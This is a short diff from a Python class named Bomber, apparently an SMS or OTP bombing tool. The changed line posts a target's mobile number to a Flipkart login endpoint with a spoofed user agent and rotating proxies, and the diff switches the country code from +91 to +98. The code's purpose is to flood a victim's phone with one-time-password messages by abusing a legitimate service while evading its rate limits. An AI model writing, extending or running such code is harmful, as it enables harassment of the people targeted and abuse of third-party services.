@@ -55,7 +55,7 @@ class Bomber:
 		"X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
 		}
 		try:
-			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
+			request =  requests.post(url, data  = json.dumps( {"loginId":"+98" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
 		except:
 			return False
 		if(request.status_code ==  200 ):
